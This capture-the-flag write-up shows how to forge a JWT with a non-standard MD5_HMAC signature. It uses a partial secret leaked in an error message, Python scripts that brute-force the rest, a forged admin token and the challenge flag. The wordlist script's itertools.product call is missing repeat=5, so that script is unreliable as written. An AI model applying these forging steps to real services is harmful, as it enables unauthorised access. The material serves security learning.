# Marmalade 5

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/a418fee4-93dc-41a9-99af-ea7a73ac5416)

I started doing this challenge when it was "easy". I finished it when it was classed as Medium. The first page we see asks us to choose a username:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/e4584e17-68ea-4b93-9924-ffd93fefa5a0)

After that it tells us that only the admin can see the flag:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/0b5d088c-1941-4ab6-aeff-2a88926c990c)

Intercepting this request, we also notice it is setting what looks like a JWT token, as it is separated in 3 different components by a dot.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/2a19e4ad-388a-4979-8687-2709e8807b08)

I created another user with only one character (because I'm lazy), and can confirm that we can decode it in https://jwt.io.

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/e6a537ac-655d-4f45-9b22-d9e6e5f039d4)

However it has a very weird header. The `MD5_HMAC` is definitely out of the ordinary and non-standard for JWT encryption. I first tried stripping that and trying a token with algorithm set to `none`. I used [jwt_tool.py](https://github.com/ticarpi/jwt_tool/blob/master/jwt_tool.py) to tamper with the header and claims.

```bash
jwt_tool.py -X a -I -pc username -pv admin 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InMifQ.49BQc1Pj96LW8tUhAHXzYA'
```

Although it didn't work, we did get an interesting error message:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/2eebd518-4582-4fce-8d57-75a64a2e28d0)

It's checking for the header so we have to keep that, however it leaked part of the secret using for signing it. We are only missing 5 of the last characters and based on what we can see, it seems it is only made up of lowercase letters.

In this case I wrote a quick short python script to generate all possible 5 lowercase letters permutations and write them to a wordlist I could then use to bruteforce the key:

```python3
import itertools

characters = 'abcdefghijklmnopqrstuvwxyz'
permutations = itertools.product(characters, 5)

with open('permutations.txt', 'w') as file:
    for perm in permutations:
        line = 'fsrwjcfszeg' + ''.join(perm) + '\n'
        file.write(line)
```

Because it's a non-standard encryption, we can't really use the jwt library in python, hashcat or john or any other of the already existing tools that I could find. In this case I created a python script to manually generate a JWT with MD5 signature based on the header and payload of the JWT I generated on the website earlier:

```python3
import base64
import hashlib
import hmac
import json

def remove_padding(encoded_string):
    return encoded_string.rstrip("=")


def jwt_creator(secret_key):
        encoded_header = 'eyJhbGciOiJNRDVfSE1BQyJ9'
        encoded_payload = 'eyJ1c2VybmFtZSI6InMifQ'

        encoded_token = encoded_header + "." + encoded_payload

        signature = hmac.new(secret_key.encode("utf-8"), encoded_token.encode("utf-8"), hashlib.md5).digest()
        encoded_signature = remove_padding(base64.urlsafe_b64encode(signature).decode("utf-8"))

        jwt_token = encoded_token + "." + encoded_signature

        return jwt_token

or_jwt = 'eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6InMifQ.49BQc1Pj96LW8tUhAHXzYA'

permutations_file = 'permutations.txt'
secret_found = None

with open(permutations_file, 'r') as f:
    for line in f:
        secret_key = line.strip()
        token = jwt_creator(secret_key)
        print(token)
        if token == or_jwt:
            secret_found = secret_key
            break

if secret_found:
    print("Found secret: " + secret_found)
else:
    print("No matching secret found.")
```

After a short while, I was able to find the secret:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/cc74a622-0c67-405a-ab7c-a78cb4a89daa)

As expected, it was all lowercase: `fsrwjcfszegvsyfa`

We can modify the script now with a new claim for the payload, we base64 encoded `{"username":"admin"}` and hardcoded it to be safe:

```python3
import base64
import hashlib
import hmac
import json

def remove_padding(encoded_string):
    return encoded_string.rstrip("=")


def jwt_creator(secret_key):
	encoded_header = 'eyJhbGciOiJNRDVfSE1BQyJ9'
	encoded_payload = 'eyJ1c2VybmFtZSI6ImFkbWluIn0'

	encoded_token = encoded_header + "." + encoded_payload

	signature = hmac.new(secret_key.encode("utf-8"), encoded_token.encode("utf-8"), hashlib.md5).digest()
	encoded_signature = remove_padding(base64.urlsafe_b64encode(signature).decode("utf-8"))

	jwt_token = encoded_token + "." + encoded_signature

	return jwt_token

print(jwt_creator('fsrwjcfszegvsyfa'))
```

The resulting token was: eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Ho2USEpkq5cYai7UhMJ9pQ

And we got the flag:

![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/fedb6b28-3825-4d22-98b0-f38ff8b65f76)

 flag{a249dff54655158c25ddd3584e295c3b}
